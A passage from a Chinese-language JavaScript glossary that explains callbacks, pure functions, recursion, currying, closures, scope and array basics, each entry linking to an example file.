作为参数传给另一个函数、由那个函数在合适时机「反过来调用」的函数，是高阶函数最常见的落地形态。按调用时机分两类：**同步回调**在当前调用栈里立刻执行（如 `arr.map` 的回调），**异步回调**先被记下来，等事件或 I/O 完成后再执行（如 `setTimeout`、`fs.readFile`、事件监听）。因为 JS 是单线程的，异步回调是「不阻塞主线程」的基本手段。常见误解是把异步回调当成「会立刻执行」——它的执行时机完全由调用方决定。也见 Callback Hell（回调地狱）。

示例：[`06_functions/09_callback_pattern.js`](06_functions/09_callback_pattern.js)

### Error-First Callback（错误优先回调）

Node.js 的传统约定：回调的第一个参数固定是错误对象，成功时为 `null` 或 `undefined`，之后的参数才是数据，例如 `fs.readFile(path, (err, data) => {})`。这样调用方只要检查第一个参数就能统一处理所有失败情形。它后来被 Promise 的 `reject`/`catch` 和 `async/await` 的 `try/catch` 取代，但阅读老代码和 `util.promisify` 时仍会大量遇到。也见 Callback（回调函数）。

示例：[`06_functions/09_callback_pattern.js`](06_functions/09_callback_pattern.js)

### Callback Hell（回调地狱）

多层嵌套的异步回调形成的「金字塔」代码，形如 `doA(function () { doB(function () { doC(...) }) })`。它的问题不只是缩进难看，更在于**错误处理要层层重复**、**无法用 `return` 中断流程**、**无法用 `try/catch` 捕获异步异常**、代码执行顺序难以追踪。它是 Promise 链和 `async/await` 出现的直接动因。交叉参考 [`18_async/03_callback_hell.js`](18_async/03_callback_hell.js)。也见 Callback（回调函数）。

示例：[`06_functions/09_callback_pattern.js`](06_functions/09_callback_pattern.js)

### Pure Function（纯函数）

同时满足两个条件的函数：**(1)** 相同输入永远得到相同输出（确定性）；**(2)** 没有任何可观察的副作用——不修改外部状态、不改动传入的参数、不做 I/O、不依赖会变化的外部值。快速判断法：把这个函数调用一万遍，除了返回值之外，程序的其他部分应该和只调用一次完全一样。它的价值在于易测试（不用 mock 环境）、可缓存（天然适合 Memoization）、可并行、可随意重排。注意「返回新对象」不算副作用，而 `arr.push`、`obj.x = 1`、`console.log`、`Date.now()` 都算。也见 Side Effect（副作用）、Referential Transparency（引用透明）。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Side Effect（副作用）

函数在执行过程中对「自身之外的世界」造成的任何可观察的改变：修改外部变量或传入的参数、写文件、发网络请求、打印日志、操作 DOM、读写 `localStorage`、调用 `Math.random()` 或 `Date.now()`。副作用本身不是坏事——一个程序如果完全没有副作用就毫无用处，所有有用的工作最终都要靠副作用落地。关键在于**把副作用推到系统的边界上**，让核心逻辑保持纯净。也见 Pure Function（纯函数）。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Referential Transparency（引用透明）

指一个表达式可以被它的**计算结果直接替换**而不改变程序行为，例如任何出现 `add(2, 3)` 的地方都能替换成 `5`。它是纯函数的等价表述之一，也是「用等式推理代码」这种函数式思维方式的基础。反例是 `Date.now()` 或 `counter++`——你无法把它们的调用替换成一个固定值，因为它们每次的结果都不一样或会改变外部状态。也见 Pure Function（纯函数）、Side Effect（副作用）。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Idempotent（幂等性）

同一个操作执行一次和执行多次，**对系统状态的影响相同**，例如 `arr.filter(...)` 之类的读取操作、HTTP 的 `PUT`/`DELETE`、`document.getElementById` 反复调用。注意区分两个层次：**幂等的**操作不改变状态所以重复无害，**纯函数**则连读取外部状态都不允许——所以纯函数一定是幂等的，幂等的函数却不一定纯（比如它可能写了日志）。这个概念在接口设计、重试机制、消息队列去重里非常关键。

示例：[`06_functions/11_pure_functions.js`](06_functions/11_pure_functions.js)

### Recursion（递归）

函数直接或间接地调用自己，把大问题拆成一个更小的同类问题。任何递归都必须包含两部分：**基线条件**（什么时候停下来）和**递归条件**（把问题缩小后交给自己），缺了前者就会无限递归直到栈溢出。它适合处理天生自相似的结构：树与目录遍历、JSON 深层查找、阶乘与斐波那契、分治算法（快排、归并）。常见误解是以为递归一定比循环慢——对树形结构来说，递归省掉了手写栈的复杂度，可读性收益远大于开销。也见 Base Case（递归基 / 终止条件）、Call Stack（调用栈）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Base Case（递归基 / 终止条件）

递归函数中「不再继续调用自己、直接返回结果」的那个分支，例如阶乘里的 `if (n <= 1) return 1`。它是递归的刹车：没有它，函数会一直调用自己直到耗尽调用栈并抛出 `RangeError: Maximum call stack size exceeded`。写递归时应当**先写基线条件再写递归条件**，并且保证每次递归调用都在向基线条件靠近。常见 bug 是基线条件写错边界（`n === 0` 漏掉了负数传入的情况）。也见 Recursion（递归）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Call Stack（调用栈）

引擎用来管理函数调用的后进先出（LIFO）结构：每调用一个函数就压入一个「栈帧」（保存参数、局部变量和返回地址），函数返回时弹出。它决定了代码的执行顺序，也是报错堆栈（stack trace）的来源——所以栈帧里函数名越清晰，调试越省力。递归深度就是这个栈的长度，压入太多帧就会 Stack Overflow（栈溢出）。也见 Recursion（递归）、Execution Context（执行上下文）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Stack Overflow（栈溢出）

调用栈被压满后继续调用函数，引擎抛出 `RangeError: Maximum call stack size exceeded`。它最常见的成因是递归缺少基线条件，或者递归深度超过引擎上限（V8 大约在一万到两万层之间，具体取决于每帧大小）。注意它与「内存溢出（OOM）」是两回事：栈溢出是栈空间不足，OOM 是堆内存不足。规避手段包括改成迭代写法、显式用数组当栈、或者用 Memoization 减少递归分支。也见 Call Stack（调用栈）、Tail Call（尾调用）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Tail Call（尾调用）

函数在**最后一步**直接返回另一个函数的调用结果，例如 `return foo(x)`——调用返回后当前函数没有任何剩余工作要做。如果写成 `return 1 + foo(x)` 就**不是**尾调用，因为调用返回后还要做一次加法。区分的关键在于「调用之后还有没有活干」：没有活干，当前栈帧理论上就可以直接被替换掉，这正是尾调用优化的前提。也见 Tail Call Optimization（尾调用优化）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Tail Call Optimization（尾调用优化）

TCO = **T**ail **C**all **O**ptimization，指引擎识别出尾调用后**复用当前栈帧**而不是新压一帧，从而让尾递归的空间复杂度从 O(n) 降到 O(1)，也就不会栈溢出。这是一项写在 ES6 规范里的特性，但现实很骨感：V8（Chrome/Node）出于调试体验和错误堆栈完整性的考虑**没有实现**它，只有 Safari 的 JavaScriptCore 实现了。因此写代码时不能依赖 TCO，深层递归应当改写成循环或显式栈。也见 Tail Call（尾调用）、Stack Overflow（栈溢出）。

示例：[`06_functions/10_recursion.js`](06_functions/10_recursion.js)

### Currying（柯里化）

以逻辑学家 Haskell Curry 命名的技术：把接收 n 个参数的函数，改造成「一次只收一个参数、收齐了才执行」的函数链，即 `add(1, 2, 3)` → `add(1)(2)(3)`。它的价值在于**延迟执行**和**函数复用**——固定住一部分配置后，得到一个可反复使用的专用函数。实现上通常靠闭包逐层收集参数，用 `fn.length` 判断参数是否收齐。也见 Partial Application（部分应用）。

示例：[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)

### Partial Application（部分应用）

固定一个函数的前几个参数，返回一个「剩下的参数还没填」的新函数，例如 `const double = multiply.bind(null, 2)` 就固定了乘数 2。它与柯里化的区别在于：柯里化强调「每次都只传一个参数」的**形式**，部分应用强调「先传一部分、剩下的以后再传」的**效果**，因此部分应用可以一次固定多个参数。实践中两者经常混用，很多库把这类工具统称「柯里化」。也见 Currying（柯里化）、`call` / `apply` / `bind`。

示例：[`06_functions/07_call_apply_bind.js`](06_functions/07_call_apply_bind.js)

### `compose` / `pipe`（函数组合）

函数组合指把多个（通常是一元的）函数串成一条流水线，前一个的输出作为后一个的输入。`compose(f, g)(x)` 等价于 `f(g(x))`，数据从右往左流（对齐数学写法）；`pipe(f, g)(x)` 等价于 `g(f(x))`，数据从左往右流（对齐人的阅读习惯）——两者实现只差一个 `reduceRight` 与 `reduce`。组合的意义在于把复杂逻辑拆成一组可命名、可单独测试的小函数，再声明式地拼起来。也见 Point-free Style（无点风格）。

示例：[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)

### Point-free Style（无点风格）

也叫「隐式编程（tacit programming）」：定义函数时不显式写出要操作的参数（「点」指的是参数），而是靠函数组合直接搭出流水线，例如写 `const getName = pipe(getUser, prop('name'))` 而不是 `const getName = user => prop('name')(getUser(user))`。它的好处是更接近「描述做什么」而非「怎么做」，坏处是可读性下降、堆栈难读、参数调试不方便。也见 `compose` / `pipe`（函数组合）。交叉参考 [`40_functional_programming/05_point_free_and_pipeline.js`](40_functional_programming/05_point_free_and_pipeline.js)。

示例：[`06_functions/12_currying_and_compose.js`](06_functions/12_currying_and_compose.js)

### Memoization（记忆化）

「用缓存换时间」的优化手法：把函数的输入当作 key、输出当作 value 存起来，下次遇到相同输入就直接返回缓存结果，不再重新计算。它要求被包装的函数尽量是 Pure Function（纯函数），否则缓存会返回过期结果；缓存对象还应当是**私有**的，只被返回的函数访问——这正是闭包最典型的用武之地。经典收益场景是朴素递归的斐波那契（从指数级降到线性）、重复的正则匹配、昂贵格式化、请求去重。注意缓存需要边界（如 LRU 或 `WeakMap`），否则可能变成内存泄漏。交叉参考 [`31_performance_and_memory/03_memoization.js`](31_performance_and_memory/03_memoization.js)。

示例：[`07_scope_and_closure/09_closure_memoization.js`](07_scope_and_closure/09_closure_memoization.js)

### Debounce（防抖）

连续触发的事件只在「停下来之后」执行一次：每次触发都清掉上一个定时器并重新计时，因此高频触发期间一次都不执行，直到安静超过设定的等待时间才执行最后一次。典型用途是搜索框输入联想（等用户停止打字再发请求）、窗口 resize、表单校验。实现依赖闭包——里面必须记住上一次的定时器 id，并且这个 id 不能被外部篡改。也见 Throttle（节流）。交叉参考 [`31_performance_and_memory/01_debounce.js`](31_performance_and_memory/01_debounce.js)。

示例：[`07_scope_and_closure/11_closure_practical.js`](07_scope_and_closure/11_closure_practical.js)

### Throttle（节流）

连续触发的事件被限制为「每隔一段时间最多执行一次」，例如每 200ms 最多跑一次，多余的触发被丢弃（或排队到最后补一次）。与防抖的区别可以这样记：**防抖是「等你安静了再说」，节流是「你再吵我也每隔一段时间理你一次」**；滚动监听、鼠标移动、拖拽这类需要「持续反馈」的场景用节流，输入联想、提交按钮这类「只要最终结果」的场景用防抖。实现上是闭包记住上一次执行的时间戳或一个开关标志。也见 Debounce（防抖）。交叉参考 [`31_performance_and_memory/02_throttle.js`](31_performance_and_memory/02_throttle.js)。

示例：[`07_scope_and_closure/11_closure_practical.js`](07_scope_and_closure/11_closure_practical.js)

### Once（一次性函数）

包装后的函数无论被调用多少次，被包装的原函数**只真正执行一次**，之后每次都直接返回首次的结果。它常用于初始化逻辑、一次性的事件监听、单例的创建。实现要点同样是闭包：用一个私有标志位记住「是否已经执行过」，并缓存首次返回值。它和 Memoization（记忆化）的区别是：一次性函数忽略后续所有输入，记忆化则按输入分别缓存。也见 Singleton（单例）。

示例：[`07_scope_and_closure/11_closure_practical.js`](07_scope_and_closure/11_closure_practical.js)

### Singleton（单例）

保证一个类或模块「无论请求多少次，永远只创建并返回同一个实例」的设计模式。JS 里最简洁的落地方式就是闭包：把实例变量藏在 IIFE（或模块作用域）里，只有在它为空时才创建。注意它与「一次性函数」的区别在于它关心的是**对象的唯一性**而非调用的唯一性。交叉参考 [`30_design_patterns/02_singleton.js`](30_design_patterns/02_singleton.js)。

示例：[`07_scope_and_closure/11_closure_practical.js`](07_scope_and_closure/11_closure_practical.js)

### `call` / `apply` / `bind`（显式绑定三兄弟）

三个定义在 `Function.prototype` 上的方法，都用来**手动指定函数执行时的 `this`**，区别只有两点——传参形式和是否立即执行：`fn.call(thisArg, a, b)` 立即执行且参数逐个传；`fn.apply(thisArg, [a, b])` 立即执行且参数用数组或类数组传；`fn.bind(thisArg, a, b)` **不执行**，返回一个「`this` 已被永久锁定」的新函数。记忆口诀：call 是逗号、apply 是 Array、bind 是返回。`bind` 因为可以预填参数，也常被用来实现 Partial Application（部分应用）。也见 Hard Binding（硬绑定）。

示例：[`06_functions/07_call_apply_bind.js`](06_functions/07_call_apply_bind.js)

### Hard Binding（硬绑定）

指用 `bind` 把一个函数的 `this` **永久固定**下来：绑定后的新函数无论被谁调用、无论用 `call` 还是 `apply` 再次指定 `this`，都不再改变，只有 `new` 调用是例外（`new` 的优先级更高）。它是解决回调里 `this` 丢失最可靠的方案（比 `const self = this` 更清晰），但代价是绑定后的函数无法再被借用。也见 Explicit Binding of this（this 的显式绑定）、`call` / `apply` / `bind`。交叉参考 [`15_this_and_context/06_this_priority.js`](15_this_and_context/06_this_priority.js)。

示例：[`06_functions/07_call_apply_bind.js`](06_functions/07_call_apply_bind.js)

### Explicit Binding of this（this 的显式绑定）

`this` 绑定规则中优先级较高的一条：通过 `call`/`apply`/`bind` 直接指定 `this`，覆盖默认绑定和隐式绑定（`obj.fn()`）。完整优先级是：`new` 绑定 > 显式绑定 > 隐式绑定 > 默认绑定；而箭头函数的词法 `this` 则完全不参与这套规则，任何绑定手段都无法改变它。常见误解是给箭头函数写 `.bind(obj)` 以为能改 `this`——实际上只是白白产生一个新函数，`this` 依旧是词法的。也见 Hard Binding（硬绑定）、Lexical this（词法 this）。交叉参考 [`15_this_and_context/04_explicit_binding.js`](15_this_and_context/04_explicit_binding.js)。

示例：[`06_functions/07_call_apply_bind.js`](06_functions/07_call_apply_bind.js)

### Eager Evaluation（立即求值）

参数或表达式在**被传进函数/被赋值的那一刻**就完成计算，JS 的默认行为就是立即求值。它的好处是行为直观、便于调试；坏处是即使这次调用根本用不到这个值也会付出代价，例如 `log(expensiveCompute(), false)` 里明明不该打印，`expensiveCompute()` 却已经跑完了。也见 Lazy Evaluation（惰性求值）。

示例：[`06_functions/14_default_parameters_tricks.js`](06_functions/14_default_parameters_tricks.js)

### Lazy Evaluation（惰性求值）

推迟到**真正需要结果的那一刻**才计算，是提高性能和表达能力的重要手段。在 JS 里模拟惰性主要有三种方式：把计算包成函数传进去（thunk，只有调用时才求值，这也是默认参数表达式的行为）、用生成器产出按需的元素（如无限序列）、或者用 `Proxy`/`getter` 延迟属性计算。它的价值在于避免无用计算、支持无限数据结构、让「先构造后使用」的逻辑解耦。也见 Eager Evaluation（立即求值）。交叉参考 [`17_iterators_and_generators/08_infinite_lazy_sequences.js`](17_iterators_and_generators/08_infinite_lazy_sequences.js)。

示例：[`06_functions/14_default_parameters_tricks.js`](06_functions/14_default_parameters_tricks.js)

### Function Properties（函数属性）

因为函数是对象，它自带几个非常实用的属性：`fn.name` 是函数名（用于日志、调试、框架自动注册），`fn.length` 是**声明的形参个数**（受默认值和 rest 参数影响，常用于判断柯里化是否收齐参数），`fn.toString()` 返回源码字符串，`fn.prototype` 只有普通函数才有（箭头函数没有，所以不能被 `new`）。另外还可以给函数挂任意自定义属性（用于记录状态、缓存等），这在开发调试工具时很常见。注意 `caller` 和 `arguments` 这两个旧属性在严格模式下访问会直接报错，不要使用。

示例：[`06_functions/13_function_properties.js`](06_functions/13_function_properties.js)

### Scope（作用域）

变量能被访问到的范围，是 JS 最核心的概念之一。它决定了「这个名字在这里能不能用」「同名时用哪一个」「变量什么时候可以被回收」。JS 中的作用域类型包括全局作用域、函数作用域、块级作用域和模块作用域，而它们之间按**定义位置**的嵌套关系构成作用域链，变量查找就沿着这条链由内向外进行。也见 Scope Chain（作用域链）、Lexical Scope（词法作用域）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Global Scope（全局作用域）

最外层的那一圈作用域，里面的变量在任何地方都能读写。在浏览器里全局对象是 `window`，在 Node.js 里是 `global`，ES2020 起可以用统一的 `globalThis` 访问。全局变量最方便也最危险：容易命名冲突、任何代码都能改它导致难以追踪、并且由于始终可达而**永远不会被回收**。也见 Global Object（全局对象 / globalThis）、Shadowing（遮蔽）。

示例：[`07_scope_and_closure/01_global_scope.js`](07_scope_and_closure/01_global_scope.js)

### Global Object（全局对象 / globalThis）

宿主环境提供的、承载全局变量的对象：浏览器是 `window`，Node.js 是 `global`，Web Worker 里是 `self`。ES2020 引入的 `globalThis` 提供了一个跨环境统一的访问方式，不用再写 `typeof window !== 'undefined'` 这种兼容判断。一个历史细节：在全局作用域里用 `var` 声明的变量会成为全局对象的属性，而 `let`/`const` 不会——它们存在于一个「全局词法环境」里，这也是浏览器控制台里有时能看见变量却取不到 `window.xxx` 的原因。也见 Global Scope（全局作用域）。

示例：[`07_scope_and_closure/01_global_scope.js`](07_scope_and_closure/01_global_scope.js)

### Function Scope（函数作用域）

在函数内部声明的变量（包括形参）只在这个函数内部可见，外部访问不到。这是 ES6 之前 JS 仅有的两种作用域之一（另一种是全局），也是「封装」的最小单位：临时变量不外泄、每次调用都创建一套全新的局部变量（递归能正常工作的前提）、执行完毕后即可被回收。注意 `var` 声明的变量不受花括号限制，只认函数边界——在 `if` 里用 `var` 声明，出了 `if` 依然能访问。也见 Block Scope（块级作用域）。

示例：[`07_scope_and_closure/02_function_scope.js`](07_scope_and_closure/02_function_scope.js)

### Block Scope（块级作用域）

ES6 引入，每一对花括号 `{}` 都形成一个新的作用域，用 `let`/`const` 声明的变量只在这个块内可见。会产生块的结构包括 `if`/`else` 的分支体、`for`/`while` 的循环体（以及 `for` 语句头部）、`switch` 的 case、`try`/`catch`（`catch` 参数是独立的块级变量）、单独写的裸块。它解决了两个老问题：循环里的 `var` 被所有回调共享的经典陷阱，以及临时变量泄漏到外层函数。也见 Function Scope（函数作用域）、Closure Loop Pitfall（循环闭包陷阱）。

示例：[`07_scope_and_closure/03_block_scope.js`](07_scope_and_closure/03_block_scope.js)

### Lexical Scope（词法作用域）

又称静态作用域：函数里的自由变量（既不是自己声明的、也不是参数的变量）按「**函数定义时所在的代码位置**」去找，而不是按「谁调用了它」去找。JS 采用的就是词法作用域，它的最大好处是**可预测**——读代码时只要看函数写在哪儿，就知道它能看到哪些变量，不需要追踪运行时的调用路径。闭包之所以能成立，根本原因也在于此：函数「记住」的是它出生地的环境。也见 Dynamic Scope（动态作用域）、Closure（闭包）。

示例：[`07_scope_and_closure/05_lexical_vs_dynamic_scope.js`](07_scope_and_closure/05_lexical_vs_dynamic_scope.js)

### Dynamic Scope（动态作用域）

另一种作用域模型：自由变量按「**函数被调用时的调用栈**」去找，谁调用我，我就用谁的作用域。Bash、早期的 Lisp、部分模板语言采用这种模型。JavaScript 采用词法作用域，但 `this` 的指向其实更像「动态」的——它由调用方式决定；正因如此，`this` 常常被称作「JS 里唯一动态的东西」，而箭头函数的词法 `this` 则把它拉回了静态世界。也见 Lexical Scope（词法作用域）、Lexical this（词法 this）。

示例：[`07_scope_and_closure/05_lexical_vs_dynamic_scope.js`](07_scope_and_closure/05_lexical_vs_dynamic_scope.js)

### Scope Chain（作用域链）

变量查找的「路线图」：用到某个标识符时，引擎从当前作用域开始一层层往外找，直到全局作用域。大致路径是「当前块 → 外层块 → 当前函数 → 外层函数 → … → 模块作用域 → 全局作用域」，找到即用，找不到则读操作抛 `ReferenceError`、写操作在非严格模式下创建全局变量。请务必分清两个概念：作用域链是**函数定义时就确定的静态结构**（由写代码的位置决定），而调用栈是运行时动态变化的。也见 Variable Lookup（变量查找）、Lexical Scope（词法作用域）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Variable Lookup（变量查找）

沿着作用域链由内向外逐层搜索标识符的过程。关键细节：查找只在「定义位置」这条静态链上进行，与函数在哪里被调用完全无关；一旦内层找到了同名变量，查找就**立即停止**，不会再去看外层。这个「就近原则」是理解 Shadowing（遮蔽）和闭包捕获的前提。也见 Scope Chain（作用域链）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Shadowing（遮蔽）

内层作用域声明了与外层同名的变量时，内层会「遮住」外层，在它作用域内访问这个名字拿到的都是内层的值。遮蔽不限于变量：形参可以遮住外层变量，块级变量可以遮住函数级变量。要特别小心「意外遮蔽」——在块里写 `let value = 1` 却同时在函数外层也有个 `value`，两者互不影响，容易造成读到旧值的 bug；另一个经典坑是在外层作用域用 `let` 声明后，内层用 `var` 声明同名变量会直接抛 SyntaxError。也见 Variable Lookup（变量查找）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Hoisting（提升）

引擎在执行代码前有一个「创建阶段」，会把 `var` 声明的变量名和函数声明提到当前作用域顶部。细节差异很重要：`var` 只提升声明、不提升赋值（提前访问得到 `undefined`），函数声明则连函数体一起提升（可以提前调用），`let`/`const` 也会被提升但处于暂时性死区（TDZ），提前访问直接抛 `ReferenceError`。也见 Function Declaration（函数声明）、`let`/`const` 的 TDZ。交叉参考 [`02_variables/04_hoisting_and_tdz.js`](02_variables/04_hoisting_and_tdz.js)。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Execution Context（执行上下文）

代码执行时所需环境的抽象描述，可以理解为「一次执行的现场记录」。它包含三部分：**变量环境 / 词法环境**（存变量与函数声明）、**`this` 的指向**、以及**外层环境的引用**（指向定义它的那个执行上下文，闭包链就靠它串联）。每当调用一个函数，引擎就为它创建一个新的执行上下文压入调用栈；全局代码也有一个全局执行上下文。也见 Variable Environment / Lexical Environment（变量环境 / 词法环境）、Call Stack（调用栈）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Variable Environment / Lexical Environment（变量环境 / 词法环境）

执行上下文内部真正「存放变量」的两个记录：**变量环境**保存 `var` 声明和函数声明，**词法环境**保存 `let`/`const`/`class` 声明，并把每个块作用域组织成一条嵌套的记录链。这个区分解释了为什么 `var` 不受块级限制而 `let`/`const` 受——它们根本被登记在不同的环境里。当内层函数引用外层环境的变量时，这个环境就随函数一起被保留下来，形成 Closure（闭包）。也见 Execution Context（执行上下文）、Closure（闭包）。

示例：[`07_scope_and_closure/04_scope_chain.js`](07_scope_and_closure/04_scope_chain.js)

### Closure（闭包）

函数与其**定义时所处的词法环境**的组合。只要函数还在被引用，它捕获的那些外部变量就不会被回收，因此闭包可以「记住」状态 —— 这正是它能实现私有变量、计数器的原因。形成闭包只需两个条件：函数嵌套，且内层函数引用了外层的变量。最大的误区是以为闭包捕获的是「值的快照」，实际上它捕获的是**变量本身**，所以循环里用 `var` 会让所有闭包看到同一个变量的最终值。

示例：[`07_scope_and_closure/06_closure_basics.js`](07_scope_and_closure/06_closure_basics.js)

### Capture（捕获）

指内层函数在其词法环境中「引用到」外层变量、从而使这些变量随函数一起被保存下来的过程。要害在于：捕获的对象是**变量（绑定）本身**，而不是它在某一时刻的值——所以内层函数读到的是变量的当前值，外层什么时候改它，闭包就什么时候看到新值。这条规则直接解释了循环陷阱，也解释了为什么用 `let` 每次迭代都创建新绑定就能修复它。也见 Closure（闭包）、Closure Loop Pitfall（循环闭包陷阱）。

示例：[`07_scope_and_closure/08_closure_loop_pitfall.js`](07_scope_and_closure/08_closure_loop_pitfall.js)

### Closure Loop Pitfall（循环闭包陷阱）

在循环里创建闭包时，如果循环变量用 `var` 声明，所有闭包共享**同一个**变量，循环结束后它们看到的都是最终值：`for (var i = 0; i < 3; i++) fns.push(() => i)` 得到 `[3, 3, 3]` 而不是 `[0, 1, 2]`。三种解法：把 `var` 换成 `let`（每次迭代创建新的绑定，最推荐）、用 IIFE 把当前值包一层传进去、或者用 `forEach` 这类自带函数作用域的回调。这个陷阱在真实项目里表现为「所有事件回调都绑到最后一个元素」「定时器输出的都是同一个值」。也见 Capture（捕获）、IIFE（立即调用函数表达式）。

示例：[`07_scope_and_closure/08_closure_loop_pitfall.js`](07_scope_and_closure/08_closure_loop_pitfall.js)

### Private State（私有状态）

只暴露读写接口、外部无法直接篡改的内部数据，可通过闭包（模块模式）或类的 `#private` 字段实现。闭包方案的好处是真正的「硬私有」——外部没有任何途径能摸到那个变量，连反射也不行；代价是每个实例都要重新创建一遍方法（内存开销更大）。要特别注意：用 `WeakMap` 或闭包保存私有状态虽然安全，但也意味着这些数据在被引用期间无法被回收。也见 Module Pattern（模块模式）。交叉参考 [`14_classes/05_private_fields.js`](14_classes/05_private_fields.js)。

示例：[`07_scope_and_closure/07_closure_private_state.js`](07_scope_and_closure/07_closure_private_state.js)

### Memory Leak（内存泄漏）

指程序中不再需要的内存因为仍然「可达」而无法被回收，长期积累会导致页面越用越卡甚至 OOM 崩溃。闭包是最常见的泄漏来源之一：被闭包捕获的变量会一直活着，如果闭包里恰好引用了大型 DOM 节点或大数组，即使这个节点已从页面上移除，也依然占着内存。典型场景包括：事件监听器注册后忘记移除、定时器未清理、缓存对象无上限增长、把 DOM 节点存在闭包变量里。交叉参考 [`31_performance_and_memory/09_memory_leak_patterns.js`](31_performance_and_memory/09_memory_leak_patterns.js)。

示例：[`07_scope_and_closure/10_closure_memory.js`](07_scope_and_closure/10_closure_memory.js)

### Garbage Collection（垃圾回收）

JS 引擎自动回收不再使用的内存的机制，现代引擎采用「可达性（reachability）」判定：只要一个对象还能从**根**（全局对象、当前调用栈、活跃的闭包等）沿着引用链被找到，它就不会被回收。所以「变量还在不在作用域里」并不是判断标准，「还有没有引用链指向它」才是——这也是闭包会阻止回收的原因。交叉参考 [`31_performance_and_memory/10_weakref_and_gc.js`](31_performance_and_memory/10_weakref_and_gc.js)。也见 Memory Leak（内存泄漏）。

示例：[`07_scope_and_closure/10_closure_memory.js`](07_scope_and_closure/10_closure_memory.js)

---

## 数组（Array）

### Array（数组）

数组是**有序、可变、以整数下标访问**的容器，但它的真实身份是「一种特殊对象」：下标被转成字符串当作属性键存储，另有一个被引擎特殊对待的 `length` 属性。元素类型可以任意且允许混合（`[1, 'a', null, []]`），长度动态增长，没有容量上限（到 2³²-1 为止）。关键细节：`typeof []` 返回 `'object'` 而不是 `'array'`，所以判断数组必须用 `Array.isArray()`（跨 iframe 也可靠，`instanceof Array` 则不可靠）。另一个高频坑是构造：`new Array(3)` 造出的是**3 个空洞的稀疏数组**，而不是 `[3]`，想要单元素数组要写 `[3]` 或 `Array.of(3)`。数组适合「有序列表 + 按下标随机访问」；若需要按任意键查找或频繁删除中间元素，应该换成 `Map`/`Set`（见 `23_collections/`）。

也见 [Sparse Array and Hole（稀疏数组与空洞）](#sparse-array-and-hole稀疏数组与空洞)、[Array-like Object（类数组对象）](#array-like-object类数组对象)。

示例：[`08_arrays/01_create_and_access.js`](08_arrays/01_create_and_access.js)

### Array-like Object（类数组对象）

类数组对象指**有 `length` 属性、有数字下标，但不是数组**的对象，典型代表是 `arguments`、DOM 的 `NodeList`/`HTMLCollection`、字符串。它们最大的特点是「看起来像数组，但没有数组的方法」——没有 `map`、`filter`、`push`，直接调用会抛 `TypeError`。要转成真数组，用 `Array.from(x)`（推荐，能同时做映射）、`[...x]`（要求对象可迭代）或 `Array.prototype.slice.call(x)`（老写法）。关键区分点：**可迭代的类数组**（`NodeList`、`arguments`、字符串）能被展开运算符直接展开，而**只有 length 没有 `Symbol.iterator`** 的对象（手写的 `{0:'a', length:1}`）只能用 `Array.from`。

也见 [Array.from, Array.of（数组构造）](#arrayfrom-arrayof数组构造)、[Iterable Destructuring（可迭代对象解构）](#iterable-destructuring可迭代对象解构)。

示例：[`08_arrays/01_create_and_access.js`](08_arrays/01_create_and_access.js)

### Array.from, Array.of（数组构造）

两个静态方法解决 `new Array()` 的两个老问题。`Array.from(可迭代或类数组, mapFn?)` 把任何可迭代对象或类数组转成真数组，可选第二参数就地做映射（等价于 `[...x].map(f)` 但少一次遍历）。`Array.of(...items)` 按参数逐个构造数组，专治 `new Array(3)` 的歧义：`Array.of(3)` 得到 `[3]`，而 `Array.from({length: 3})` 得到 `[undefined, undefined, undefined]`（**密集**的真 undefined，不是空洞）。关键细节：`Array.from` 会把稀疏数组的空洞**填成真 `undefined`**，这一点和展开运算符一致，而 `Array.prototype.slice` 会保留空洞。

也见 [Array-like Object（类数组对象）](#array-like-object类数组对象)、[Sparse Array and Hole（稀疏数组与空洞）](#sparse-array-and-hole稀疏数组与空洞)。

示例：[`08_arrays/01_create_and_access.js`](08_arrays/01_create_and_access.js)、[`08_arrays/19_sparse_and_length.js`](08_arrays/19_sparse_and_length.js)

### Sparse Array and Hole（稀疏数组与空洞）

稀疏数组不是「元素值是 `undefined`」，而是「**这个下标根本没有对应的属性**」，这个缺失的位置叫空洞（hole）。区分方法很直接：`const a = new Array(3)` 后 `0 in a` 是 `false`（空洞），而 `[undefined, undefined, undefined]` 的 `0 in b` 是 `true`（真的有值）。这个区别会**静默改变方法行为**：`forEach`/`map`/`filter`/`some`/`every`/`reduce`/`indexOf` 会**跳过空洞**（内部按属性存在性遍历），而 `find`/`findIndex`/`findLast`/`includes` 按取值处理、**不跳过**——于是 `[1, , 3].indexOf(undefined)` 是 `-1`，但 `[1, , 3].includes(undefined)` 却是 `true`。此外 `join`/`toString` 把空洞当空串，`JSON.stringify` 把它变成 `null`，`[...arr]` 和 `Array.from` 把它变成真 `undefined`。

**常见误解**：以为「稀疏数组和填了 `undefined` 的数组是一回事」——几乎所有「同一个数组不同方法给出不同结果」的困惑都源于此。

也见 [Array length（数组的 length 属性）](#array-length数组的-length-属性)、[delete Operator and Array（delete 与数组）](#delete-operator-and-arraydelete-与数组)。

示例：[`08_arrays/19_sparse_and_length.js`](08_arrays/19_sparse_and_length.js)

### Array length（数组的 length 属性）

